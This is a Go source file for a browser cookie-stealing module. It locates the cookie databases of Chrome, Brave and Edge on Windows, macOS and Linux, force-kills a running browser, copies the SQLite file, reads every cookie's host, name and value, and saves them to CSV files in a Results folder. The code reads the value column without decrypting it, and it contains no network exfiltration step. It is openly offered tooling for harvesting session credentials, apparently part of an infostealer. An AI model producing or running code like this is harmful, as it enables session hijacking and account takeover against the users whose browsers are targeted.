package cookies

import (
	"database/sql"
	"encoding/csv"
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"

	_ "github.com/mattn/go-sqlite3"
)

// Cookie represents a browser cookie
type Cookie struct {
	HostKey string
	Name    string
	Value   string
}

// GetCookiesPath returns the path to the cookies database for a browser
func GetCookiesPath(browser string) (string, error) {
	homeDir, err := os.UserHomeDir()
	if err != nil {
		return "", fmt.Errorf("error getting user home directory: %v", err)
	}

	var cookiesPath string

	switch runtime.GOOS {
	case "windows":
		switch browser {
		case "chrome":
			cookiesPath = filepath.Join(homeDir, "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Network", "Cookies")
		case "brave":
			cookiesPath = filepath.Join(homeDir, "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data", "Default", "Network", "Cookies")
		case "edge":
			cookiesPath = filepath.Join(homeDir, "AppData", "Local", "Microsoft", "Edge", "User Data", "Default", "Network", "Cookies")
		default:
			return "", fmt.Errorf("unsupported browser: %s", browser)
		}
	case "darwin": // macOS
		switch browser {
		case "chrome":
			cookiesPath = filepath.Join(homeDir, "Library", "Application Support", "Google", "Chrome", "Default", "Network", "Cookies")
		case "brave":
			cookiesPath = filepath.Join(homeDir, "Library", "Application Support", "BraveSoftware", "Brave-Browser", "Default", "Network", "Cookies")
		case "edge":
			cookiesPath = filepath.Join(homeDir, "Library", "Application Support", "Microsoft Edge", "Default", "Network", "Cookies")
		default:
			return "", fmt.Errorf("unsupported browser: %s", browser)
		}
	case "linux":
		switch browser {
		case "chrome":
			cookiesPath = filepath.Join(homeDir, ".config", "google-chrome", "Default", "Network", "Cookies")
		case "brave":
			cookiesPath = filepath.Join(homeDir, ".config", "BraveSoftware", "Brave-Browser", "Default", "Network", "Cookies")
		case "edge":
			cookiesPath = filepath.Join(homeDir, ".config", "microsoft-edge", "Default", "Network", "Cookies")
		default:
			return "", fmt.Errorf("unsupported browser: %s", browser)
		}
	default:
		return "", fmt.Errorf("unsupported operating system: %s", runtime.GOOS)
	}

	return cookiesPath, nil
}

// IsBrowserRunning checks if a browser is currently running
func IsBrowserRunning(browser string) bool {
	var cmd *exec.Cmd
	browserLower := strings.ToLower(browser)

	switch runtime.GOOS {
	case "windows":
		cmd = exec.Command("tasklist", "/FI", fmt.Sprintf("IMAGENAME eq %s.exe", browserLower))
	case "darwin":
		cmd = exec.Command("pgrep", browserLower)
	case "linux":
		cmd = exec.Command("pgrep", browserLower)
	default:
		return false
	}

	output, err := cmd.Output()
	if err != nil {
		return false
	}

	return strings.Contains(strings.ToLower(string(output)), browserLower)
}

// CloseBrowser attempts to close a running browser
func CloseBrowser(browser string) error {
	browserLower := strings.ToLower(browser)

	switch runtime.GOOS {
	case "windows":
		cmd := exec.Command("taskkill", "/F", "/IM", fmt.Sprintf("%s.exe", browserLower))
		return cmd.Run()
	case "darwin", "linux":
		cmd := exec.Command("pkill", browserLower)
		return cmd.Run()
	default:
		return fmt.Errorf("unsupported operating system: %s", runtime.GOOS)
	}
}

// ExtractCookies extracts cookies from a browser
func ExtractCookies(browser string) ([]Cookie, error) {
	cookiesPath, err := GetCookiesPath(browser)
	if err != nil {
		return nil, err
	}

	if _, err := os.Stat(cookiesPath); os.IsNotExist(err) {
		return nil, fmt.Errorf("cookies database not found at %s", cookiesPath)
	}

	// Check if browser is running and close it if necessary
	if IsBrowserRunning(browser) {
		fmt.Printf("[*] Browser %s is running, attempting to close it...\n", browser)
		if err := CloseBrowser(browser); err != nil {
			fmt.Printf("[-] Failed to close browser: %v\n", err)
			// Continue anyway, we might still be able to access the file
		}
	}

	// Create a copy of the cookies database to avoid file locking issues
	tempDB := "temp_cookies.db"
	if err := copyFile(cookiesPath, tempDB); err != nil {
		return nil, fmt.Errorf("error copying cookies database: %v", err)
	}
	defer os.Remove(tempDB)

	// Open the database
	db, err := sql.Open("sqlite3", tempDB)
	if err != nil {
		return nil, fmt.Errorf("error opening cookies database: %v", err)
	}
	defer db.Close()

	// Query the cookies
	rows, err := db.Query("SELECT host_key, name, value FROM cookies")
	if err != nil {
		return nil, fmt.Errorf("error querying cookies: %v", err)
	}
	defer rows.Close()

	// Process the results
	var cookies []Cookie
	for rows.Next() {
		var cookie Cookie
		if err := rows.Scan(&cookie.HostKey, &cookie.Name, &cookie.Value); err != nil {
			fmt.Printf("[-] Error scanning cookie: %v\n", err)
			continue
		}
		cookies = append(cookies, cookie)
	}

	if err := rows.Err(); err != nil {
		return nil, fmt.Errorf("error iterating over cookies: %v", err)
	}

	return cookies, nil
}

// SaveCookiesToCSV saves cookies to a CSV file
func SaveCookiesToCSV(cookies []Cookie, outputPath string) error {
	// Create the directory if it doesn't exist
	dir := filepath.Dir(outputPath)
	if err := os.MkdirAll(dir, 0755); err != nil {
		return fmt.Errorf("error creating directory: %v", err)
	}

	// Create the CSV file
	file, err := os.Create(outputPath)
	if err != nil {
		return fmt.Errorf("error creating CSV file: %v", err)
	}
	defer file.Close()

	// Create CSV writer
	writer := csv.NewWriter(file)
	defer writer.Flush()

	// Write header
	if err := writer.Write([]string{"host_key", "name", "value"}); err != nil {
		return fmt.Errorf("error writing CSV header: %v", err)
	}

	// Write cookies
	for _, cookie := range cookies {
		if err := writer.Write([]string{cookie.HostKey, cookie.Name, cookie.Value}); err != nil {
			return fmt.Errorf("error writing cookie to CSV: %v", err)
		}
	}

	return nil
}

// ExtractCookiesFromAllBrowsers extracts cookies from all supported browsers
func ExtractCookiesFromAllBrowsers() error {
	// Create results directory
	resultsDir := "Results"
	if err := os.MkdirAll(resultsDir, 0755); err != nil {
		return fmt.Errorf("error creating results directory: %v", err)
	}

	browsers := []string{"chrome", "brave", "edge"}
	totalCookies := 0

	for _, browser := range browsers {
		fmt.Printf("[+] Extracting cookies from %s...\n", browser)

		cookies, err := ExtractCookies(browser)
		if err != nil {
			fmt.Printf("[-] Error extracting %s cookies: %v\n", browser, err)
			continue
		}

		if len(cookies) > 0 {
			// Save browser-specific cookies
			outputPath := filepath.Join(resultsDir, fmt.Sprintf("%s_cookies.csv", browser))
			if err := SaveCookiesToCSV(cookies, outputPath); err != nil {
				fmt.Printf("[-] Error saving %s cookies: %v\n", browser, err)
			} else {
				fmt.Printf("[+] Saved %d %s cookies to %s\n", len(cookies), browser, outputPath)
				totalCookies += len(cookies)
			}
		} else {
			fmt.Printf("[-] No cookies found for %s\n", browser)
		}
	}

	if totalCookies > 0 {
		fmt.Printf("[+] Successfully extracted a total of %d cookies\n", totalCookies)
	} else {
		fmt.Println("[-] No cookies found in any browser")
	}

	return nil
}

// Helper function to copy a file
func copyFile(src, dst string) error {
	sourceFile, err := os.Open(src)
	if err != nil {
		return err
	}
	defer sourceFile.Close()

	destFile, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer destFile.Close()

	_, err = io.Copy(destFile, sourceFile)
	return err
}
